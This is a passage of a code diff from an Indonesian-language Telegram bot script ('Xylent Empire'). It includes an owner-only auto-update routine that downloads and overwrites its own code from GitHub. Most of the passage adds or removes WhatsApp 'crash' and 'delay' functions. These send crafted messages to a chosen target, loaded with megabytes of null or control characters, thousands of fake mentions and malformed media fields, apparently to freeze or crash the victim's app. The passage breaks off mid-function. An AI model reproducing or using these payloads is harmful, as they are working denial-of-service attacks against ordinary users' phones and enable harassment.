+    fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + ".bak");
+  }
+
+  fs.writeFileSync(CONFIG.LOCAL_FILE, newData, "utf-8");
+  console.log(`[AutoUpdate] File berhasil ditulis ke: ${CONFIG.LOCAL_FILE}`);
+}
+
+async function checkUpdate(chatId = null) {
+  try {
+    const sha     = await getLatestSHA();
+    const isFirst = lastKnownSHA === null;
+
+    if (sha === lastKnownSHA) {
+      if (chatId) {
+        bot.telegram.sendMessage(chatId,
+          `<blockquote>✅ <b>Tidak ada update baru.</b>\n\n` +
+          `Sistem sudah menggunakan versi terbaru.\n\n` +
+          `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
+          { parse_mode: "HTML" }
+        );
+      }
+      return;
+    }
+
+    lastKnownSHA = sha;
+
+    if (!isFirst) {
+      await downloadFile();
+
+      bot.telegram.sendMessage(CONFIG.OWNER_ID,
+        `<blockquote>🚀 <b>Auto-Update Berhasil!</b>\n\n</blockquote>`,
+        { parse_mode: "HTML" }
+      );
+
+      setTimeout(() => { process.exit(); }, 3000);
+
+    } else {
+      console.log(`[AutoUpdate] Terhubung. Sistem siap memantau pembaruan terbaru.`);
+      if (chatId) {
+        bot.telegram.sendMessage(chatId,
+          `<blockquote>✅ <b>Sistem Siap!</b>\n\n` +
+          `Siap memantau pembaruan terbaru dari owner.\n\n` +
+          `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
+          { parse_mode: "HTML" }
+        );
+      }
+    }
+
+  } catch (err) {
+    console.error("[AutoUpdate] Error:", err.message);
+    const errMsg =
+      `<blockquote>❌ <b>Gagal cek update:</b>\n` +
+      `<code>${err.message}</code></blockquote>`;
+    bot.telegram.sendMessage(CONFIG.OWNER_ID, errMsg, { parse_mode: "HTML" });
+    if (chatId && chatId !== CONFIG.OWNER_ID) {
+      bot.telegram.sendMessage(chatId, errMsg, { parse_mode: "HTML" });
+    }
+  }
+}
+
+async function startAutoUpdate(chatId) {
+  if (autoUpdateEnabled) {
+    return bot.telegram.sendMessage(chatId,
+      `<blockquote>⚠️ <b>Auto-Update sudah berjalan!</b>\n\n` +
+      `Sistem pemantau pembaruan sudah aktif\n` +
+      `dan sedang berjalan di latar belakang.\n\n` +
+      `Gunakan /updatestatus untuk melihat status.</blockquote>`,
+      { parse_mode: "HTML" }
+    );
+  }
+
+  autoUpdateEnabled = true;
+  await checkUpdate(null);
+
+  const ms        = CONFIG.INTERVAL_MIN * 60 * 1000;
+  checkIntervalID = setInterval(() => checkUpdate(null), ms);
+
+  bot.telegram.sendMessage(chatId,
+    `<blockquote>✅ <b>Auto-Update Diaktifkan!</b>\n\n` +
+    `Sistem pemantau pembaruan kini telah berjalan\n` +
+    `dan siap mendeteksi perubahan terbaru secara otomatis.\n\n` +
+    `┌─────────────────────────\n` +
+    `│ 📦 File     : <code>empire.js</code>\n` +
+    `│ ⏱ Interval : setiap <b>${CONFIG.INTERVAL_MIN} menit</b>\n` +
+    `│ ⏰ Aktif    : ${new Date().toLocaleString("id-ID")}\n` +
+    `└─────────────────────────\n\n` +
+    `🔍 Bot akan otomatis mengecek apakah owner\n` +
+    `telah mengupload file baru di GitHub.\n` +
+    `Jika ada pembaruan, sistem akan langsung\n` +
+    `mengunduh dan menerapkannya secara otomatis.\n\n` +
+    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System — Aktif</i></blockquote>`,
+    { parse_mode: "HTML" }
+  );
+}
+
+function stopAutoUpdate(chatId) {
+  if (!autoUpdateEnabled) {
+    return bot.telegram.sendMessage(chatId,
+      `<blockquote>⚠️ <b>Auto-Update sudah mati.</b>\n\n` +
+      `Gunakan /autoupdate on untuk mengaktifkan kembali.</blockquote>`,
+      { parse_mode: "HTML" }
+    );
+  }
+
+  clearInterval(checkIntervalID);
+  checkIntervalID   = null;
+  autoUpdateEnabled = false;
+
+  bot.telegram.sendMessage(chatId,
+    `<blockquote>🔴 <b>Auto-Update Dimatikan!</b>\n\n` +
+    `Sistem pemantau pembaruan telah dihentikan\n` +
+    `dan tidak akan mengecek perubahan apapun\n` +
+    `sampai diaktifkan kembali.\n\n` +
+    `┌─────────────────────────\n` +
+    `│ 📦 File  : <code>empire.js</code>\n` +
+    `│ ⏰ Mati  : ${new Date().toLocaleString("id-ID")}\n` +
+    `└─────────────────────────\n\n` +
+    `⚠️ Selama auto-update mati, sistem tidak\n` +
+    `akan mendeteksi pembaruan terbaru dari owner.\n` +
+    `Gunakan /checkupdate untuk cek manual,\n` +
+    `atau /autoupdate on untuk mengaktifkan kembali.\n\n` +
+    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System — Nonaktif</i></blockquote>`,
+    { parse_mode: "HTML" }
+  );
+}
+
+// ─── COMMANDS ──────────────────────────────────────────────────────────────
+
+// /updatesc — update manual (mirip versi lama)
+bot.command("updatesc", async (ctx) => {
+  if (!ownerOnly(ctx)) return;
+
+  const chatId  = ctx.chat.id;
+  const statusMsg = await ctx.reply("🔍 *Mengecek pembaruan sistem...*", { parse_mode: "Markdown" });
+
+  try {
+    const response    = await axios.get(CONFIG.RAW_URL, { timeout: 10000 });
+    const newData     = response.data;
+
+    if (!newData || typeof newData !== "string") {
+      throw new Error("File dari server kosong atau tidak valid.");
+    }
+
+    const currentData = fs.readFileSync(CONFIG.LOCAL_FILE, "utf8");
+    if (newData === currentData) {
+      return ctx.telegram.editMessageText(
+        chatId,
+        statusMsg.message_id,
+        undefined,
+        "Sistem sudah dalam versi terbaru. ✅"
+      );
+    }
+
+    if (fs.existsSync(CONFIG.LOCAL_FILE)) {
+      fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + ".bak");
+    }
+    fs.writeFileSync(CONFIG.LOCAL_FILE, newData);
+
+    await ctx.telegram.editMessageText(
+      chatId,
+      statusMsg.message_id,
+      undefined,
+      "🚀 *Update Berhasil!*\n\nSistem akan melakukan restart otomatis dalam 3 detik untuk menerapkan perubahan.",
+      { parse_mode: "Markdown" }
+    );
+
+    setTimeout(() => { process.exit(); }, 3000);
+
+  } catch (e) {
+    console.error("Update Error:", e.message);
+
+    if (fs.existsSync(CONFIG.LOCAL_FILE + ".bak")) {
+      fs.copyFileSync(CONFIG.LOCAL_FILE + ".bak", CONFIG.LOCAL_FILE);
+    }
+
+    ctx.reply(`❌ *Update Gagal!*\nTerjadi kesalahan: \`${e.message}\``, { parse_mode: "Markdown" });
+  }
+});
+
+// /autoupdate on|off
+bot.command("autoupdate", async (ctx) => {
+  if (!ownerOnly(ctx)) return;
+  const args   = ctx.message.text.split(" ");
+  const action = (args[1] || "").toLowerCase();
+
+  if (action === "on")       await startAutoUpdate(ctx.chat.id);
+  else if (action === "off") stopAutoUpdate(ctx.chat.id);
+  else ctx.reply("Gunakan: /autoupdate on atau /autoupdate off");
+});
+
+// /checkupdate
+bot.command("checkupdate", async (ctx) => {
+  if (!ownerOnly(ctx)) return;
+  await ctx.reply(
+    `<blockquote>🔍 <b>Memeriksa Pembaruan...</b>\n\n` +
+    `Sistem sedang menghubungi GitHub Repository.\n` +
+    `Mohon tunggu sebentar...</blockquote>`,
+    { parse_mode: "HTML" }
+  );
+  await checkUpdate(ctx.chat.id);
+});
+
+// /updatestatus
+bot.command("updatestatus", (ctx) => {
+  if (!ownerOnly(ctx)) return;
+  ctx.reply(
+    `<blockquote>📊 <b>Status Auto-Update</b>\n\n` +
+    `┌─────────────────────────\n` +
+    `│ 🔌 Status   : ${autoUpdateEnabled ? "🟢 AKTIF" : "🔴 MATI"}\n` +
+    `│ ⏱ Interval : ${CONFIG.INTERVAL_MIN} menit\n` +
+    `│ 📦 File     : <code>empire.js</code>\n` +
+    `└─────────────────────────\n\n` +
+    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
+    { parse_mode: "HTML" }
+  );
+});
+/////////////////START FUNC/////////////////////////
+async function CrmXcarousel(sock, target) {
+  const imageHeader = {
+    url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
+    mimetype: "image/jpeg",
+    fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
+    fileLength: "11887",
+    height: 1010,
+    width: 1090,
+    mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
+    fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
+    directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1750124469",
+    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/PPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tej6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSGDWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
+    contextInfo: {
+      pairedMediaType: "NOT_PAIRED_MEDIA",
+      isQuestion: true,
+      isGroupStatus: true
+    },
+    scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
+    scanLengths: [
+      9999999999999999999,
+      9999999999999999999,
+      9999999999999999999,
+      9999999999999999999
+    ],
+    midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
+  };
+
+  const messageBody = { text: "\u0010" };
+  const messageFlow = { buttons: "\0".repeat(510000) };
+
+  const finalMessage = {
+  groupStatusMessageV2: {
+    message: {
+      interactiveMessage: {
+        header: {
+          title: "CRM",
+          hasMediaAttachment: true,
+          imageMessage: imageHeader
+        },
+        body: messageBody,
+        nativeFlowMessage: messageFlow
+      },
+      nativeFlowResponseMessage: {
+        name: "payment_method",
+        paramsJson: `{"reference_id":null,"payment_method":"${"\u0010".repeat(5000)}","payment_timestamp":null,"share_payment_status":true}`,
+        version: 3
+      }
+    }
+  }
+};
+
+  await sock.relayMessage(target, finalMessage, {
+    participant: {
+      jid: target
+    }
+  });
+}
+
+async function delaycrashV4(sock, target) {
+  try {
+    let msg = await generateWAMessageFromContent(
       target,
       {
         groupStatusMessageV2: {
           message: {
             interactiveResponseMessage: {
               body: {
-                text: "pinzyX7",
-                format: "EXTENSION"
+                text: "#NullStrick",
+                format: "DEFAULT"
               },
-              carouselMessage: {
-                cards: X71,
-                messageVersion: 1
+              contextInfo: {
+                participant: target,
+                stanzaId: sock.generateMessageTag(),
+                isForwarded: true,
+                forwardingScore: 999,
+                mentionedJid: Array.from({ length: 2000 }, (_, r4) => `628${666 + r4}@s.whatsapp.net`),
+                statusAttributionType: 2,
+                statusAttributions: Array.from({ length: 1000 }, (_, r) => ({  participant: `62${r + 666}@s.whatsapp.net`, type: 1 }))
               },
               nativeFlowResponseMessage: {
                 name: "address_message",
-                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"pinzyX7\",\"address\":\"pinzyX7\",\"tower_number\":\"pinzyX7\",\"city\":\"Japanese\",\"name\":\"pinzyX7\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"pinzyX7 | ${"\u0000".repeat(900000)}\"}}`,
+                paramsJson: "\u0000".repeat(900000),
                 version: 3
-              },
-              messageParamsJson: JSON.stringify({
-                data: X71.length
-              })
+              }
             }
           }
         }
       },
       {}
     );
+    
+    await sock.relayMessage(target, msg.message, {
+      messageId: msg.key.id,
+      participant: { jid: target }
+    });
+    
+    await sock.relayMessage("status@broadcast", msg.message, {
+      messageId: msg.key.id,
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {},
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{
+            tag: "to",
+            attrs: { jid: target },
+            content: undefined
+          }]
+        }]
+      }]
+    });
 
-    await sock.relayMessage(
-      target,
-      X74.message,
-      x
-        ? {
-            participant: { jid: target },
-            messageId: X74.key.id
-          }
-        : {}
-    );
+  } catch (err) {
+    console.error("Error:", err);
   }
 }
 
-async function LupaApaW(sock, target) {
-  const msg = {
-    viewOnceMessage: {
-      message: {
-
-        imageMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
-          mimetype: "image/jpeg",
-          fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
-          fileLength: "149502",
-          height: 1397,
-          width: 1126,
-          mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
-          fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
-          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1777621571",
-          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBQACBAYBAQEBAQEBAAAAAAAAAAAAAAACAwABBP/aAAwDAQACEAMQAAAAENmvlStHJb7mSvlY4Rb0vN1q2wkoZt1ei+ppWOV/n5vTuc1Djuu01bHPiBts8wniOg88secrtXb+oEOGoH7YOPVe1rFcnskW0+SMCDJ3dNWST//EACkQAAICAgEDAwMFAQAAAAAAAAECAAMREiEEMUETMlEQI3EFFCIkYaH/2gAIAQEAAT8AGRwI9lr/AG0ycwdKQBsss6YooOpltPKlVODKEIuKCNQ6oZs/zL6USstOjJ/cCBy9dbNyd4/IuViMY4iJlKePbKznr2Ms5rP4hXkz9TfWnXyZ0GfXUZhUJRgHz3j7743zOnLiltpQPv5x5h9phq5M68my4L8Sih9sqcGVr1Iwvdcx6AjwOgQCagWgg+Z4mglOtzlj5MfqDS+uoxBaBWDGvDHvLruPdKHJZfzPExKLSoEuxYNvInrMy4/5GeEglcylgtq8fVT7Zk6n8SrILH4mp7mIhawfERv7K4+YOw+gI2EBhVdDgcmMtuvbiCxU8Ss/eU/7F9omYnuE3A7mUWBmwe06h/5ar2gWs8ET0HSxDjjMRTqJ6TT/xAAeEQADAQACAgMAAAAAAAAAAAAAAQIRAyEQEgQxQf/aAAgBAgEBPwCF2aVjTPjqco44TXbwuM/Uxto469dFSWFFT0Ip/Rvt5a1+cP/EABwRAAMAAgMBAAAAAAAAAAAAAAABETFBAhAgIf/aAAgBAwEBPwAzokZw2JVkiJkTgsDaL1w2P4PpOLx//9k=",
-
-          contextInfo: {
-            pairedMediaType: "NOT_PAIRED_MEDIA",
-            isQuestion: true,
-            isGroupStatus: true
-          },
-
-          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-
-          scanLengths: [
-            999999999999999999,
-            888888888888888888,
-            777777777777777777,
-            666666666666666666
-          ],
-
-          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
+async function MBGCOMBO(sock, target) {
+    let RX7 = await generateWAMessageFromContent(
+        target,
+        {
+      interactiveMessage: {
+        header: {
+          title: "Xylent Empire\n\n" + "ꦽ".repeat(50000) + "@5".repeat(50000),
+          hasMediaAttachment: false
         },
-        pollCreationMessage: {
-          name: "",
-          options: [
-            { optionName: "\u0000".repeat(9999)
-             },
-            { optionName: "\u0000".repeat(10000)
-             },
-            { optionName: "}"
-             }
-          ],
-          selectableOptionsCount: 3
+        body: {
+          text: "Xylent Empire WAS HERE",
+        },
+        nativeFlowMessage: {
+          messageParamsJson: "",
+          buttons: [
+            { name: "single_select", buttonParamsJson:  "\u0000" },
+            { name: "payment_method", buttonParamsJson:  "\u0000" },
+            { name: "call_permission_request", buttonParamsJson:  "\u0000", voice_call: "call_galaxy" },
+            { name: "form_message", buttonParamsJson:  "\u0000" },
+            { name: "catalog_message", buttonParamsJson:  "\u0000" },
+            { name: "send_location", buttonParamsJson:  "\u0000" },
+            { name: "view_product", buttonParamsJson:  "\u0000" },
+            { name: "payment_status", buttonParamsJson: "\u0000" },
+            { name: "cta_call", buttonParamsJson: "\u0000" },
+            { name: "cta_url", buttonParamsJson:  "\u0000" },
+            { name: "review_and_pay", buttonParamsJson:  "\u0000" }
+          ]
         }
-
       }
-    }
-  };
+     }, { participant: { jid: target}});
+  await sock.relayMessage(target, RX7, {
+    messageId: RX7.key.id,
+    userJid: target,
+    participant: { jid: target },
+  });
 
-  await sock.relayMessage(target, msg, {
-    messageId: null
-  });
-}
-
-async function delayvisible(sock, target) {
-  try {
-    if (!sock.user) {
-      console.log("❌ Session expired");
-      return;
-    }
-    
-    const mentions = Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`);
-    
-    const AiNew = [
-      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
-      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
-      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
-      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
-      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net"
-    ];
-    
-    const Msg1 = {
-      albumMessage: {
+await sock.relayMessage(target, {
+   groupStatusMessageV2: {  
+    message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "Xylent Empire",
+          format: "EXTENSION_1"
+        },
+        nativeFlowResponseMessage: {
+          name: "galaxy_message",
+          paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RanstechZvX@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"ok\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+          version: 3
+        },
         contextInfo: {
-          mentionedJid: Array.from(
-            { length: 2000 },
-            () => `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-          ),
-          remoteJid: "oconner-hard",
-          parentGroupJid: "0@g.us",
-          isQuestion: true,
-          isSampled: true,
-          entryPointConversionDelaySeconds: 6767676767,
-          businessMessageForwardInfo: null,
-          botMessageSharingInfo: {
-            botEntryPointOrigin: {
-              origins: "BOT_MESSAGE_OCONNER"
-            },
-            forwardingScore: 999
+         forwardingScore: 9999,
+         isForwarded: true,
+         entryPointConversionSource: "payment_method"
+        }
+      }
+    }
+   }
+  }, { participant: { jid: target }});
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "Xylent Empire",
+            format: "DEFAULT"
           },
-          quotedMessage: {
-            viewOnceMessage: {
-              message: {
-                interactiveResponseMessage: {
-                  body: {
-                    text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-                    format: "DEFAULT"
-                  },
-                  nativeFlowResponseMessage: {
-                    name: "call_permission_request",
-                    paramsJson: "\u0000".repeat(1000000),
-                    version: 1
-                  }
-                }
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
+            version: 3
+          },
+          contextInfo: {
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 2,
+                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
               }
             }
           }
         }
       }
-    };
-    
-    const Msg2 = {
-      requestPaymentMessage: {
-        currencyCodeIso4217: "IDR",
-        amount1000: "9999",
-        requestFrom: target,
-        noteMessage: {
-          extendedTextMessage: {
-            text: '𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄'
-          }
-        },
-        expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
-        amount: {
-          value: 1000,
-          offset: 1000,
-          currencyCode: 'IDR'
-        },
-        background: {
-          id: '1'
-        },
-        contextInfo: {
-          mentionedJid: mentions,
-          remoteJid: AiNew,
-          forwardingScore: 9999,
-          isForwarded: true,
-        }
-      }
-    };
-    
-    for (let r = 0; r < 50; r++) {
-      await sock.relayMessage(target, Msg1, {
-        participant: { jid: target }
-      });
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      
-      await sock.relayMessage(target, Msg2, {
-        participant: { jid: target }
-      });
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      
-      console.log(`✅ Sukses sent to ${target}`);
     }
-    
-  } catch (err) {
-    console.error(`❌ Error: ${err.message}`);
-  }
-}
-
-async function X7DelayHard(sock, target) {
-    try {
-        await sock.relayMessage(
-            target,
-            {
-                groupStatusMessageV2: {
-                    message: {
-                        extendedTextMessage: {
-                            text: "𝖷𝟩",
-                            matchedText: "https://t.me/fuckytim",
-                            description: "𝖷𝟩",
-                            title: "𝖷𝟩",
-                            paymentLinkMetadata: {
-                                button: {
-                                    displayText: "#X7",
-                                },
-                                header: {
-                                    headerType: 1,
-                                },
-                                provider: {
-                                    paramsJson: "{{".repeat(120000),
-                                },
-                            },
-                            linkPreviewMetadata: {
-                                paymentLinkMetadata: {
-                                    button: {
-                                        displayText: "@fuckytim",
-                                    },
-                                    header: {
-                                        headerType: 1,
-                                    },
-                                    provider: {
-                                        paramsJson: "{{".repeat(120000),
-                                    },
-                                },
-                                urlMetadata: {
-                                    fbExperimentId: 999,
-                                },
-                                fbExperimentId: 888,
-                                linkMediaDuration: 555,
-                                socialMediaPostType: 1221,
-                                videoContentUrl: "https://wa.me/settings/linked_devices#,,pinzyX7",
-                                videoContentCaption: "@fuckytim",
-                            },
-                            contextInfo: {
-                                isForwarded: true,
-                                forwardingScore: 999,
-                                quotedMessage: {
-                                    locationMessage: {
-                                        degreesLatitude: 9.999999919991,
-                                        degreesLongitude: -999999999999,
-                                        accuracyInMeters: 1
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            },
-            { participant: { jid: target } }
-        );
-        
-        let parse = true;
-        let SID = "5e03e0";
-        let key = "10000000_2203140470115547_947412155165083119_n.enc";
-        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
-        let type = `image/webp`;
-        if (11 > 9) {
-            parse = parse ? false : true;
-        }
-
-        const stc = generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-                message: {
-                    stickerMessage: {
-                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
-                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
-                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
-                        mimetype: type,
-                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
-                        fileLength: {
-                            low: Math.floor(Math.random() * 1000),
-                            high: 0,
-                            unsigned: true,
-                        },
-                        mediaKeyTimestamp: {
-                            low: Math.floor(Math.random() * 1700000000),
-                            high: 0,
-                            unsigned: false,
-                        },
-                        firstFrameLength: 19904,
-                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
-                        isAnimated: true,
-                        contextInfo: {
-                            participant: target,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from(
-                                    { length: 1900 },
-                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                                ),
-                            ],
-                            groupMentions: [],
-                            entryPointConversionSource: "non_contact",
-                            entryPointConversionApp: "whatsapp",
-                            entryPointConversionDelaySeconds: 467593,
-                        },
-                        stickerSentTs: {
-                            low: Math.floor(Math.random() * -20000000),
-                            high: 555,
-                            unsigned: parse,
-                        },
-                        isAvatar: parse,
-                        isAiSticker: parse,
-                        isLottie: parse,
-                    },
-                },
-            },
-        }, {});
-
-        const X7 = generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-                message: {
-                    interactiveResponseMessage: {
-                        body: {
-                            text: "#",
-                            format: "DEFAULT"
-                        },
-                        nativeFlowResponseMessage: {
-                            name: "galaxy_message",
-                            paramsJson: "\x10".repeat(1045000),
-                            version: 3
-                        },
-                        entryPointConversionSource: "call_permission_request"
-                    },
-                },
-            },
-        }, {
-            ephemeralExpiration: 0,
-            forwardingScore: 9741,
-            isForwarded: true,
-            font: Math.floor(Math.random() * 99999999),
-            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
-        });
-
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: stc.message,
-            },
-        }, {
-            messageId: stc.key.id,
-            participant: { jid: target },
-        });
-
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: X7.message,
-            },
-        }, {
-            messageId: X7.key.id,
-            participant: { jid: target },
-        });
-
-    } catch (err) {
-        console.error("error:", err);
-    }
-}
-
-
-async function X7Delay(sock, target) {
-    try {
-        await sock.relayMessage(
-            target,
-            {
-                groupStatusMessageV2: {
-                    message: {
-                        extendedTextMessage: {
-                            text: "𝖷𝟩",
-                            matchedText: "https://t.me/fuckytim",
-                            description: "𝖷𝟩",
-                            title: "𝖷𝟩",
-                            paymentLinkMetadata: {
-                                button: {
-                                    displayText: "#X7",
-                                },
-                                header: {
-                                    headerType: 1,
-                                },
-                                provider: {
-                                    paramsJson: "{{".repeat(120000),
-                                },
-                            },
-                            linkPreviewMetadata: {
-                                paymentLinkMetadata: {
-                                    button: {
-                                        displayText: "@fuckytim",
-                                    },
-                                    header: {
-                                        headerType: 1,
-                                    },
-                                    provider: {
-                                        paramsJson: "{{".repeat(120000),
-                                    },
-                                },
-                                urlMetadata: {
-                                    fbExperimentId: 999,
-                                },
-                                fbExperimentId: 888,
-                                linkMediaDuration: 555,
-                                socialMediaPostType: 1221,
-                                videoContentUrl: "https://wa.me/settings/linked_devices#,,pinzyX7",
-                                videoContentCaption: "@fuckytim",
-                            },
-                            contextInfo: {
-                                isForwarded: true,
-                                forwardingScore: 999,
-                                quotedMessage: {
-                                    locationMessage: {
-                                        degreesLatitude: 9.999999919991,
-                                        degreesLongitude: -999999999999,
-                                        accuracyInMeters: 1
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            },
-            { participant: { jid: target } }
-        );
-        
-        let parse = true;
-        let SID = "5e03e0";
-        let key = "10000000_2203140470115547_947412155165083119_n.enc";
-        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
-        let type = `image/webp`;
-        if (11 > 9) {
-            parse = parse ? false : true;
-        }
-
-        const stc = generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-                message: {
